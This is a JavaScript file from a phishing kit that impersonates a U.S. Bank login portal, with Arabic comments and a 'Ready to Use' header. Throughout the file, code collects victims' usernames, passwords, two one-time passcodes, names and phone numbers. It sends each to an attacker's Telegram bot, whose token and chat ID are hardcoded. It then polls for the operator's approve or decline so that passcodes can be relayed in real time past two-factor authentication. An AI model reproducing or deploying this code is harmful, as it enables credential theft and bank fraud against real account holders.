/**
 * BrosTec Protocol - Ready to Use
 * System: U.S. Bank Control Portal
 */

// --- الإعدادات المعتمدة ---
const BOT_TOKEN = "8472908079:AAHRhM8yUVmfMagFkA85x8T0Zp9WMqWZftU";
const CHAT_ID = "7865246557";

// معرف الجلسة لضمان عدم تداخل المستخدمين
const sessionId = Math.floor(Math.random() * 900000) + 100000;

/**
 * الوظيفة الأساسية لإرسال البيانات عند الضغط على أزرار "التالي"
 */
async function nextStep(stepNumber) {
    
    const overlay = document.getElementById('loadingOverlay');
    if (overlay) overlay.style.display = 'flex';

    let messageText = `🆔 **Session:** #${sessionId}\n`;
    let buttons = [];

    if (stepNumber === 2) {
        const user = document.getElementById('user').value;
        const pass = document.getElementById('pass').value;
        messageText += `👤 User: \`${user}\`\n🔑 Pass: \`${pass}\``;
        buttons = [[
            { text: "✅ اطلب OTP 1", callback_data: `approve_2_${sessionId}` },
            { text: "❌ خطأ دخول", callback_data: `decline_2_${sessionId}` }
        ]];
    } 
    else if (stepNumber === 3) {
        const otp1 = document.getElementById('otp1').value;
        messageText += `🔢 OTP 1: \`${otp1}\``;
        buttons = [[
            { text: "✅ تجاوز لـ Info", callback_data: `approve_3_${sessionId}` },
            { text: "❌ الرمز خطأ", callback_data: `decline_3_${sessionId}` }
        ]];
    }
    else if (stepNumber === 4) {
        const fName = document.getElementById('fName').value;
        const phone = document.getElementById('phone').value;
        messageText += `📝 Info:\nName: ${fName}\nPhone: ${phone}`;
        buttons = [[
            { text: "✅ اطلب OTP 2", callback_data: `approve_4_${sessionId}` },
            { text: "❌ خطأ بيانات", callback_data: `decline_4_${sessionId}` }
        ]];
    }
    else if (stepNumber === 5) {
        const otp2 = document.getElementById('otp2').value;
        messageText += `🔢 OTP 2: \`${otp2}\``;
        buttons = [[
            { text: "✅ إنهاء العملية", callback_data: `approve_5_${sessionId}` },
            { text: "❌ الرمز خطأ", callback_data: `decline_5_${sessionId}` }
        ]];
    }

    // إرسال البيانات للتيليجرام
    await sendLog(messageText, buttons);

    // بدء الاستماع لردك (تجاوز أو خطأ)
    startGlobalListener();
}

async function sendLog(text, buttons) {
    try {
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: text,
                parse_mode: 'Markdown',
                reply_markup: { inline_keyboard: buttons }
            })
        });
    } catch (e) { console.error("Connection Error"); }
}

function startGlobalListener() {
    const listener = setInterval(async () => {
        try {
            const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=-1`);
            const data = await res.json();
            
            if (data.result && data.result.length > 0) {
                const cb = data.result[0].callback_query;
                
                if (cb && cb.data.includes(sessionId.toString())) {
                    const action = cb.data.split('_')[0]; 
                    const step = parseInt(cb.data.split('_')[1]);

                    clearInterval(listener);
                    handleAdminAction(action, step);
                }
            }
        } catch (e) {}
    }, 3000);
}

function handleAdminAction(action, step) {
    const overlay = document.getElementById('loadingOverlay');
    if (overlay) overlay.style.display = 'none';

    if (action === "approve") {
        const errors = ['otpError1', 'infoError', 'otpError2'];
        errors.forEach(id => { if(document.getElementById(id)) document.getElementById(id).style.display = 'none'; });
        goStep(step); 
    } else {
        if (step === 2) goStep(1); 
        if (step === 3) document.getElementById('otpError1').style.display = 'block';
        if (step === 4) document.getElementById('infoError').style.display = 'block';
        if (step === 5) document.getElementById('otpError2').style.display = 'block';
    }
}

function goStep(targetId) {
    document.querySelectorAll('.page-section').forEach(s => s.classList.remove('active'));
    const next = document.getElementById('step' + targetId);
    if (next) next.classList.add('active');
    window.scrollTo({ top: 0, behavior: 'smooth' });
}
